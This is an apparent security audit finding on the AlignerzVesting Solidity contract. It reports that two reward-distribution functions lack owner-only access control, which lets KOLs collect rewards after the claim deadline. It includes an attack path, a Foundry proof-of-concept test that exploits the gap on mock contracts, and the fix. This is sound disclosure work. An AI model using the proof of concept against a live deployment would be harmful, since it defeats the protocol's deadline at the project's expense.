# [000912] Unauthorized Post-Deadline Reward Distribution in AlignerzVesting
  
  ### Summary

The functions `distributeRewardTVS()` and `distributeStablecoinAllocation()` are intended to allow the **owner** to distribute unclaimed rewards after the claim deadline. However:

- **No `onlyOwner` check exists**.
- **Anyone** can call these functions and trigger distributions.

Effectively, users or attackers can claim their rewards even after the deadline has passed.

### Root Cause

[`distributeRewardTVS()`](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L525) and [`distributeStablecoinAllocation()`](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L540) lack an access modifier like `onlyOwner`.


```solidity
// No access control
function distributeRewardTVS(uint256 rewardProjectId, address[] calldata kol) external { ... }
function distributeStablecoinAllocation(uint256 rewardProjectId, address[] calldata kol) external { ... }
```

Users are supposed to claim via `claimRewardTVS()` / `claimStablecoinAllocation()` **before the deadline**, which is properly restricted to `msg.sender`.

### Internal Pre-conditions

1. `launchRewardProject` has been called
2. `rewardProject.claimDeadline` has passed.

### External Pre-conditions

N/A

### Attack Path

1. Project creator launches a reward project `launchRewardProject`.
2. Project creator sets a `setStablecoinAllocation` for that project.
3. The deadline passes.
4. KOLs can still call `distributeRewardTVS()` or `distributeStablecoinAllocation()` with a list of KOL addresses.

### Impact

KOLs are able to claim their rewards even after the deadline has passed, which clearly defeats the purpose of a deadline. 


### PoC

## Proof Of Concept

Add the following test suite into `test/RewardProject.t.sol` and run in the console

```bash
forge clean
forge test --mt test_claim_after_deadline -vv
```

You will see the test pass, with `claimStablecoinAllocation` correctly reverting after the deadline, but the KOL can still call `distributeStablecoinAllocation`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/cryptography/MerkleProof.sol";
import {Aligners26} from "../src/contracts/token/Aligners26.sol";
import {AlignerzNFT} from "../src/contracts/nft/AlignerzNFT.sol";
import {MockUSD} from "../src/MockUSD.sol";
import {AlignerzVesting} from "../src/contracts/vesting/AlignerzVesting.sol";
import {Upgrades} from "openzeppelin-foundry-upgrades/Upgrades.sol";
import {CompleteMerkle} from "murky/src/CompleteMerkle.sol";
import {A26ZDividendDistributor} from "src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AlignerzVestingProtocolTest is Test {
    AlignerzVesting public vesting;
    Aligners26 public token;
    AlignerzNFT public nft;
    MockUSD public usdt;
    A26ZDividendDistributor public distributor;
    address public owner;
    address public projectCreator;
    address[] public bidders;

    // Constants
    uint256 constant NUM_BIDDERS = 20;
    uint256 constant TOKEN_AMOUNT = 26_000_000 ether;
    uint256 constant BIDDER_USD = 1_000 ether;
    uint256 constant PROJECT_ID = 0;

    // Project structure for organization
    struct BidInfo {
        address bidder;
        uint256 amount;
        uint256 vestingPeriod;
        uint256 poolId;
        bool accepted;
    }

    // Track allocated bids and their proofs
    mapping(address => bytes32[]) public bidderProofs;
    mapping(address => uint256) public bidderPoolIds;
    mapping(address => uint256) public bidderNFTIds;
    bytes32 public refundRoot;

    function setUp() public {
        owner = address(this);
        projectCreator = makeAddr("projectCreator");
        vm.deal(projectCreator, 100 ether);

        // Deploy contracts
        usdt = new MockUSD();

        token = new Aligners26("26Aligners", "A26Z");
        nft = new AlignerzNFT("AlignerzNFT", "AZNFT", "https://nft.alignerz.bid/");

        address payable proxy = payable(
            Upgrades.deployUUPSProxy("AlignerzVesting.sol", abi.encodeCall(AlignerzVesting.initialize, (address(nft))))
        );
        vesting = AlignerzVesting(proxy);

        // Set NFT minter to vesting contract
        vm.prank(owner);
        distributor = new A26ZDividendDistributor(
            address(vesting), address(nft), address(usdt), block.timestamp, 1 weeks, address(token)
        );
        nft.addMinter(proxy);
        vesting.setTreasury(address(1));

        usdt.mint(projectCreator, 2e18);

        // Mint tokens for project creator
        token.transfer(projectCreator, TOKEN_AMOUNT);
        vesting.transferOwnership(projectCreator);

        // Approve tokens for vesting contract
        vm.prank(projectCreator);
        token.approve(address(vesting), TOKEN_AMOUNT);
    }

    function test_claim_after_deadline() public {
        address KOL1 = makeAddr("KOL1");
        address KOL2 = makeAddr("KOL2");
        vm.startPrank(projectCreator);
        vesting.setVestingPeriodDivisor(1);

        vm.startPrank(projectCreator);
        usdt.approve(address(vesting), 1e18);
        vesting.launchRewardProject(address(token), address(usdt), block.timestamp, 1 weeks);
        address[] memory kolStablecoin = new address[](2);
        kolStablecoin[0] = KOL1;
        kolStablecoin[1] = KOL2;
        uint256[] memory stablecoinAmounts = new uint256[](2);
        stablecoinAmounts[0] = 5e17;
        stablecoinAmounts[1] = 5e17;
        vesting.setStablecoinAllocation(0, 1e18, kolStablecoin, stablecoinAmounts);

        vm.startPrank(KOL1);
        vesting.claimStablecoinAllocation(0);
        vm.warp(2 weeks);
        vm.startPrank(KOL2);
        vm.expectRevert();
        // KOL can't claim via claimStablecoinAllocation after the deadline
        vesting.claimStablecoinAllocation(0);
        address[] memory kolAddr = new address[](1);
        kolAddr[0] = KOL2;
        // but KOL can claim via distributeStablecoinAllocation even after the deadline
        vesting.distributeStablecoinAllocation(0, kolAddr);
    }
}
```

### Mitigation

Add access control
```solidity
function distributeRewardTVS(...) external onlyOwner { ... }
function distributeStablecoinAllocation(...) external onlyOwner { ... }
```
  